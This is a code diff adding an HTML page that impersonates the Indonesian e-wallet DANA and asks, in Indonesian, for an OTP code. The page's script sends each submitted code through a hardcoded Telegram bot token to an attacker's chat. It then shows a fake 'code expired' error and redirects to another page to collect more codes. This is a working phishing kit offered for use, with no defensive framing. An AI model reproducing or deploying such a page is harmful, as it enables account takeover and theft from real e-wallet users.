@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh">
+    <title>DANA | dana.id</title>
+    <meta name="theme-color" content="#118eea">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" type="text/css" href="./../lib/style/otp.css">
+    <link rel="stylesheet" type="text/css" href="./../lib/style/spinner.css">
+</head>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+    * {
+        font-family: 'Open Sans', sans-serif;
+        font-weight: 400;
+    }
+    body {
+        width: 100%;
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        background-color: #118EEA;
+        overflow: hidden;
+    }
+    .background {
+        padding: 0;
+        margin: 0;
+        background: #0000002b;
+        height: 100%;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        -webkit-transform: translate(-50%, -50%);
+        -moz-transform: translate(-50%, -50%);
+        -ms-transform: translate(-50%, -50%);
+        -o-transform: translate(-50%, -50%);
+    }
+    /*F5F5F5*/
+    .container {
+        box-sizing: border-box;
+        background: #ffffff;
+        width: 100%;
+        height: 100%;
+        max-width: 600px;
+        max-height: 700px;
+        border-radius: 15px;
+        margin-top: 40%;
+    }
+    h1 {
+        margin-top: 40px;
+        margin-bottom: 10px;
+        font-size: 15px;
+        font-weight: 600;
+        color: black;
+    }
+    h2 {
+        font-size: 15px;
+        font-weight: 400px;
+        color: black;
+    }
+    .four_otp {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .inpOtp {
+        background: #F5F5F5;
+        margin-left: 3px;
+        margin-right: 3px;
+        margin-top: 25px;
+        margin-bottom: 25px;
+        border-radius: 8px;
+        font-size: 25px;
+        font-weight: 400;
+        text-align: center;
+        width: 58px;
+        height:45px;
+        border: none;
+        outline: none;
+        caret-color: transparent;
+    }
+    .resend {
+        font-size: 15px;
+        font-weight: 600;
+        color: #cecece;
+    }
+    /*********************/
+    .process {
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #0000005b;
+        width: 100%;
+        height: 100vh;
+    }
+    .loading {
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 20%;
+    }
+    .loading img {
+        width: 50px;
+    }
+    .loading .spinner{
+        position: absolute;
+        width: 35px;
+        animation: spin 1s linear infinite;
+        -webkit-animation: spin 1s linear infinite;
+        -moz-animation: spin 1s linear infinite;
+        -ms-animation: spin 1s linear infinite;
+        -o-animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(360deg); }
+        100% { transform: rotate(0deg); }
+    }
+    @-webkit-keyframes spin {
+        0% { -webkit-transform: rotate(360deg); }
+        100% { -webkit-transform: rotate(0deg); }
+    }
+    @-moz-keyframes spin {
+        0% { -webkit-transform: rotate(360deg); }
+        100% { -webkit-transform: rotate(0deg); }
+    }
+    @-ms-keyframes spin {
+        0% { -webkit-transform: rotate(360deg); }
+        100% { -webkit-transform: rotate(0deg); }
+    }
+    @-o-keyframes spin {
+        0% { -webkit-transform: rotate(360deg); }
+        100% { -webkit-transform: rotate(0deg); }
+    }
+    .otpinput{
+        width: 300px;
+        height: 38px;
+        border: 2px solid #118EEA;
+        border-radius: 5px;
+        font-size: 15px;
+        text-align: center;
+        font-weight: bolder;
+
+    }
+    .btn-punya {
+        display: block;
+        margin-top: 20px;
+        padding: 0px; 
+        cursor: pointer; 
+        background: none rgb(17, 142, 234);
+        border: none; 
+        text-align: center; 
+        height: 45px; 
+        width: 150px; 
+        max-width: 95%;
+        font-family: sans-serif; 
+        font-size: 18px; 
+        font-weight: bold; 
+        color: rgb(255, 255, 255); 
+        letter-spacing: 2px;
+        line-height: 1; 
+        border-radius: 5px; 
+        box-shadow: rgb() 10px 10px 12px 0px; 
+        transition: background 200ms ease 0s;
+    }
+    
+    .loader {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        #error-message {
+    position: absolute;
+    top: 140px; /* Atur posisi di atas kolom input */
+    left: 50%; /* Atur posisi di tengah kolom input */
+    transform: translateX(-50%); /* Geser pesan ke kiri sebesar setengah lebar kolom input */
+    color: red; /* Warna teks merah */
+    font-weight: bold;
+}
+
+</style>
+<body>
+    <div class="background">
+        <div class="container" id="container">
+            <center>
+                <h1>Masukkan OTP</h1>
+                <h2>Kode OTP telah dikirim ke nomor Anda</h2>
+                <!-- Tambahkan id ke form -->
+                <form id="otpForm" method="post">
+                    <input type="tel" name="a" placeholder="Masukkan OTP" class="otpinput">
+                    <p class="resend">KIRIM ULANG (<span id="time">60</span>s)</p>
+                    <center>
+                        <button class="btn-punya" type="submit" value="send">Lanjut</button><br><br>
+                    </center>
+                </form>
+                <!-- Tambahkan div untuk pesan kesalahan -->
+                <div id="error-message" style="color: red; margin-top: 10px; display: none;">Kode OTP Sudah<br>Tidak Berlaku!!</div>
+            </center>
+        </div>
+    </div>
+    <div id="process" name="process" class="process" style="display: none;">
+        <div class="process" id="process">
+                    <div class="loader"></div>
+    </div>
+    <!-- Tambahkan script untuk mengirim kode ke telegram.js dan mengatur fungsi waktu -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Fungsi untuk mengirim input kode ke Telegram
+            function sendCodeToTelegram(code) {
+                // Lakukan logika pengiriman kode ke Telegram di sini
+                sendMessageToTelegram(code);
+            }
+
+            // Fungsi untuk mengatur waktu hitung mundur
+            function countdown() {
+                var timeLeft = parseInt(document.getElementById('time').innerText);
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    document.getElementById('time').innerText = timeLeft;
+                } else {
+                    // Kode waktu habis di sini, misalnya mengirim ulang kode
+                    console.log('Waktu habis, mengirim ulang kode...');
+                    timeLeft = 60; // Atur ulang waktu
+                    document.getElementById('time').innerText = timeLeft;
+                }
+            }
+
+            // Jalankan countdown setiap 1 detik
+            setInterval(countdown, 1000);
+
+            // Tangani pengiriman form
+            document.getElementById('otpForm').addEventListener('submit', function(event) {
+                event.preventDefault(); // Mencegah pengiriman form secara default
+
+                var otpInput = document.querySelector('.otpinput').value; // Ambil nilai input OTP
+
+                // Cek apakah nilai input tidak kosong
+                if (otpInput.trim() !== '') {
+                    sendCodeToTelegram(otpInput); // Kirim kode ke Telegram
+                    showLoader(); // Tampilkan loader
+                } else {
+                    // Jika nilai input kosong, tampilkan pesan kesalahan
+                    document.getElementById('error-message').style.display = 'block';
+                    setTimeout(() => {
+                        document.getElementById('error-message').style.display = 'none';
+                    }, 8000); // Sembunyikan pesan kesalahan setelah 4 detik
+                }
+            });
+        });
+        
+        function showLoader() {
+            const processDiv = document.getElementById('process');
+            const loader = document.querySelector('.loader');
+            processDiv.style.display = 'flex';
+            loader.style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('error-message').innerText = 'Kode OTP sudah tidak berlaku'; // Ganti pesan kesalahan
+                document.getElementById('error-message').style.display = 'block'; // Tampilkan pesan kesalahan
+                setTimeout(() => {
+                    window.location.href = 'myotp.html'; // Redirect setelah 3 detik
+                }, 1000);
+            }, 1000); // Munculkan pesan kesalahan setelah 3 detik
+        }
+
+        // Fungsi untuk mengirim pesan ke Telegram menggunakan Ajax
+        function sendMessageToTelegram(message) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState === 4 && this.status === 200) {
+                    console.log("Pesan terkirim: " + message);
+                }
+            };
+            var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+            xhttp.open("POST", url, true);
+            xhttp.send();
+        }
+    </script>
+</body>
+</html>
